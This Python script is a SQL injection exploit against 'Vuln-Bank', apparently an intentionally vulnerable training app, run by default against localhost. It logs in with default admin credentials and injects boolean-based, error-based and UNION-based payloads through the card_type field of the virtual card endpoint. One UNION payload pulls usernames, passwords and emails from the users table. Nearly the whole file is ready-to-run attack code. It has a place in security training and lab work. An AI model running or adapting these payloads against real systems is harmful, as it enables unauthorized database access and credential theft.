#!/usr/bin/env python3
"""
Card Type SQL Injection Exploit for Vuln-Bank

This script demonstrates a critical SQL injection vulnerability in the virtual card creation functionality
of Vuln-Bank where the application doesn't properly sanitize the card_type parameter, allowing an attacker
to perform SQL injection attacks that can lead to data exfiltration, authentication bypass, and more.

Usage:
    python3 exploit.py [target_url]

Example:
    python3 exploit.py http://localhost:5000
"""

import requests
import json
import sys
import argparse
import time
from colorama import init, Fore, Style

# Initialize colorama for colored output
init()

def login(base_url, username="admin", password="admin123"):
    """
    Login to get a valid JWT token
    
    Args:
        base_url: The base URL of the vulnerable application
        username: Username to use for login
        password: Password to use for login
        
    Returns:
        tuple: (token, user_data) if login successful, (None, None) otherwise
    """
    print(f"{Fore.BLUE}[*] Logging in as {username}...{Style.RESET_ALL}")
    
    login_url = f"{base_url}/login"
    payload = {"username": username, "password": password}
    headers = {"Content-Type": "application/json"}
    
    try:
        response = requests.post(login_url, headers=headers, json=payload)
        
        if response.status_code == 200:
            data = response.json()
            token = data.get('token')
            if token:
                print(f"{Fore.GREEN}[+] Login successful! Got valid JWT token.{Style.RESET_ALL}")
                return (token, data)
            else:
                print(f"{Fore.RED}[-] Login successful but no token received.{Style.RESET_ALL}")
                return (None, None)
        else:
            print(f"{Fore.RED}[-] Login failed. Status code: {response.status_code}{Style.RESET_ALL}")
            print(f"{Fore.RED}[-] Response: {response.text}{Style.RESET_ALL}")
            return (None, None)
    except Exception as e:
        print(f"{Fore.RED}[-] Error during login: {str(e)}{Style.RESET_ALL}")
        return (None, None)

def create_card_with_sqli_payload(base_url, token, payload):
    """
    Create a virtual card with a SQL injection payload in the card_type parameter
    
    Args:
        base_url: The base URL of the vulnerable application
        token: JWT token for authentication
        payload: SQL injection payload to inject
        
    Returns:
        tuple: (success, response_data) where success is a boolean and response_data is the response data
    """
    print(f"{Fore.BLUE}[*] Creating virtual card with SQL injection payload: {payload}{Style.RESET_ALL}")
    
    card_url = f"{base_url}/virtual_card"
    headers = {
        "Content-Type": "application/json",
        "Authorization": f"Bearer {token}"
    }
    
    data = {
        "card_limit": 1000.0,
        "card_type": payload  # SQL injection payload
    }
    
    try:
        response = requests.post(card_url, headers=headers, json=data)
        
        if response.status_code == 200:
            print(f"{Fore.GREEN}[+] Card creation request successful!{Style.RESET_ALL}")
            return (True, response.json())
        elif response.status_code == 500:
            print(f"{Fore.YELLOW}[!] Server error (500) - This might indicate a successful SQL injection{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}[!] Response: {response.text}{Style.RESET_ALL}")
            return (True, response.text)
        else:
            print(f"{Fore.RED}[-] Card creation failed. Status code: {response.status_code}{Style.RESET_ALL}")
            print(f"{Fore.RED}[-] Response: {response.text}{Style.RESET_ALL}")
            return (False, response.text)
    except Exception as e:
        print(f"{Fore.RED}[-] Error creating card: {str(e)}{Style.RESET_ALL}")
        return (False, str(e))

def test_boolean_based_sqli(base_url, token):
    """
    Test for boolean-based SQL injection
    
    Args:
        base_url: The base URL of the vulnerable application
        token: JWT token for authentication
        
    Returns:
        bool: True if vulnerable, False otherwise
    """
    print(f"{Fore.BLUE}[*] Testing for boolean-based SQL injection...{Style.RESET_ALL}")
    
    # Test with a true condition
    true_payload = "standard' AND 1=1 --"
    true_success, true_response = create_card_with_sqli_payload(base_url, token, true_payload)
    
    # Test with a false condition
    false_payload = "standard' AND 1=2 --"
    false_success, false_response = create_card_with_sqli_payload(base_url, token, false_payload)
    
    # Compare responses to determine if boolean-based injection is possible
    if true_success and not false_success:
        print(f"{Fore.RED}[-] Vulnerability confirmed! Boolean-based SQL injection is possible.{Style.RESET_ALL}")
        return True
    else:
        print(f"{Fore.GREEN}[+] Boolean-based SQL injection test inconclusive.{Style.RESET_ALL}")
        return False

def test_error_based_sqli(base_url, token):
    """
    Test for error-based SQL injection
    
    Args:
        base_url: The base URL of the vulnerable application
        token: JWT token for authentication
        
    Returns:
        bool: True if vulnerable, False otherwise
    """
    print(f"{Fore.BLUE}[*] Testing for error-based SQL injection...{Style.RESET_ALL}")
    
    # Test with a payload that should cause a database error
    error_payload = "standard' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a) --"
    success, response = create_card_with_sqli_payload(base_url, token, error_payload)
    
    # Check if the response contains database error messages
    if success and isinstance(response, str) and ("error" in response.lower() or "exception" in response.lower() or "syntax" in response.lower()):
        print(f"{Fore.RED}[-] Vulnerability confirmed! Error-based SQL injection is possible.{Style.RESET_ALL}")
        return True
    else:
        print(f"{Fore.GREEN}[+] Error-based SQL injection test inconclusive.{Style.RESET_ALL}")
        return False

def extract_user_data(base_url, token):
    """
    Attempt to extract user data using SQL injection
    
    Args:
        base_url: The base URL of the vulnerable application
        token: JWT token for authentication
        
    Returns:
        bool: True if successful, False otherwise
    """
    print(f"{Fore.BLUE}[*] Attempting to extract user data...{Style.RESET_ALL}")
    
    # UNION-based SQL injection to extract user data
    union_payload = "standard' UNION SELECT username, password, email, 'dummy', 'dummy', 'dummy' FROM users --"
    success, response = create_card_with_sqli_payload(base_url, token, union_payload)
    
    if success:
        print(f"{Fore.RED}[-] Vulnerability confirmed! UNION-based SQL injection is possible.{Style.RESET_ALL}")
        print(f"{Fore.RED}[-] Response: {json.dumps(response, indent=2) if isinstance(response, dict) else response}{Style.RESET_ALL}")
        return True
    else:
        print(f"{Fore.GREEN}[+] UNION-based SQL injection test inconclusive.{Style.RESET_ALL}")
        return False

def main():
    parser = argparse.ArgumentParser(description='Card Type SQL Injection Exploit for Vuln-Bank')
    parser.add_argument('target_url', nargs='?', default='http://localhost:5000', help='Target URL of the Vuln-Bank application')
    parser.add_argument('--username', default='admin', help='Username to use for login')
    parser.add_argument('--password', default='admin123', help='Password to use for login')
    parser.add_argument('--payload', default=None, help='Custom SQL injection payload to use')
    args = parser.parse_args()
    
    base_url = args.target_url.rstrip('/')
    
    print(f"{Fore.YELLOW}=== Vuln-Bank Card Type SQL Injection Exploit ==={Style.RESET_ALL}")
    print(f"{Fore.BLUE}[*] Target: {base_url}{Style.RESET_ALL}")
    
    # Login to get a token
    token, user_data = login(base_url, args.username, args.password)
    
    if not token:
        print(f"{Fore.RED}[-] Failed to get token. Exiting.{Style.RESET_ALL}")
        sys.exit(1)
    
    # If a custom payload is provided, use it
    if args.payload:
        success, response = create_card_with_sqli_payload(base_url, token, args.payload)
        print(f"{Fore.YELLOW}[!] Custom payload test complete.{Style.RESET_ALL}")
    else:
        # Otherwise, run the standard tests
        boolean_vulnerable = test_boolean_based_sqli(base_url, token)
        error_vulnerable = test_error_based_sqli(base_url, token)
        union_vulnerable = extract_user_data(base_url, token)
    
    print(f"\n{Fore.YELLOW}=== Summary of Findings ==={Style.RESET_ALL}")
    
    if args.payload:
        if success:
            print(f"{Fore.RED}[-] Custom payload test was successful.{Style.RESET_ALL}")
        else:
            print(f"{Fore.GREEN}[+] Custom payload test failed.{Style.RESET_ALL}")
    else:
        if boolean_vulnerable or error_vulnerable or union_vulnerable:
            print(f"{Fore.RED}[-] Application is vulnerable to SQL Injection in the card_type parameter{Style.RESET_ALL}")
            print(f"{Fore.RED}[-] This is a critical vulnerability that allows attackers to extract sensitive data and potentially take control of the database{Style.RESET_ALL}")
            
            if boolean_vulnerable:
                print(f"{Fore.RED}[-] Boolean-based SQL injection: Vulnerable{Style.RESET_ALL}")
            if error_vulnerable:
                print(f"{Fore.RED}[-] Error-based SQL injection: Vulnerable{Style.RESET_ALL}")
            if union_vulnerable:
                print(f"{Fore.RED}[-] UNION-based SQL injection: Vulnerable{Style.RESET_ALL}")
        else:
            print(f"{Fore.GREEN}[+] Application does not appear to be vulnerable to SQL Injection in the card_type parameter{Style.RESET_ALL}")
    
    print(f"\n{Fore.YELLOW}[!] Card Type SQL Injection testing complete.{Style.RESET_ALL}")

if __name__ == "__main__":
    main()
